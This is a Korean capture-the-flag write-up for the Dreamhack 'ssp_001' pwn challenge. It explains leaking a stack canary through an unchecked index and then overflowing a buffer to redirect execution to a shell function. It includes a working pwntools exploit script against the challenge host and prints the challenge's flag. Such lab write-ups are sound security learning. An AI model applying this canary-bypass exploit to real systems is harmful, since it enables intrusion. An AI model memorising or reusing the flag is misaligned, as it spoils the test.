---
ctf_name: "wargame"
challenge_name: "ssp_001"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "aswe0810m"
date: "2026-05-05"
points: 500
tags: [canary, stack buffer overflow]
---

# ssp_001

## 문제 설명

> 이 문제는 작동하고 있는 서비스(ssp_001)의 바이너리와 소스코드가 주어집니다.
> 프로그램의 취약점을 찾고 SSP 방어 기법을 우회하여 익스플로잇해 셸을 획득한 후, "flag" 파일을 읽으세요.
> "flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{...} 입니다.

- https://dreamhack.io/wargame/challenges/33

## 풀이

### 분석

먼저 checksec 명령으로 ssp_001이라는 실행 프로그램을 확인해보았을 때, 32bit little기반의 파일이며 Canary와 NX가 적용되어 있으며 PIE는 적용되지 않았음을 알 수 있었다. 프로그램을 실행해 보았을 때 F, P, E의 분기를 입력받아 각 분기마다 값을 출력하거나 입력받는 등의 작동을 함을 알 수 있었다.

### 취약점

프로그램의 코드를 확인해보니 name 배열의 경우 값 입력의 크기를 사용자가 정할 수 있으므로 여기서 stack buffer overflow 취약점이 발생할 수 있었다. 또한 canary의 경우 box를 출력하는 곳에서 idx를 사용자가 정하여 출력하므로 canary를 출력하도록 하여 카나리 값을 알아내어 이를 통해 프로그램 내부의 쉘코드를 실행할 수 있었다.

### 익스플로잇

먼저 프로그램을 디스어셈블해보았을 때 각각의 변수들의 위치를 확인해보니 gs:[0x14]의 경우 ebp-0x8, name의 경우 ebp-0x48, box의 경우 ebp-0x88에 있었다. 따라서 처음에 box의 idx를 0x80, 0x82, 0x84, ...으로 설정하면 gs:[0x14]인 카나리 값을 알 수 있었다. 이를 통해 name변수의 크기를 0x50으로 설정하고 처음 40바이트를 아무 값이나 넣고 처음에 얻었던 canary값을 넣고 edi와 ebp에 아무값이나 넣고 ret을 shell_code의 주소로 설정한다.

```python
from pwn import *

p = remote("host3.dreamhack.games", 9574)

canary = []

for i in range(4):
    p.sendline(b"P")
    p.sendline(str(0x80+i).encode())

    p.recvuntil(b"is : ")
    canary.append(int(p.recvline(), 16))
    
canary = bytes(canary)

payload = b"A"*0x40 + canary + b"B"*0x8 + p32(0x080486b9)

p.sendline(b"E")
p.sendline(str(len(payload)).encode())
p.sendline(payload)

p.interactive()
```

## 플래그

```
DH{00c609773822372daf2b7ef9adbdb824}
```

## 배운 점

이 문제를 통해서 canary를 우회하는 방법을 알게 되었다. 또한 스택 오버플로우에 대한 개념도 조금 더 정확하게 알게된 것 같다. canary에 의해서 값의 변조를 예방했지만 값을 출력하는 함수들의 취약점을 분석하여 canary 값을 알아내고 이를 통해서 값을 변조하는 방법이 있다는 것을 알게되었다.
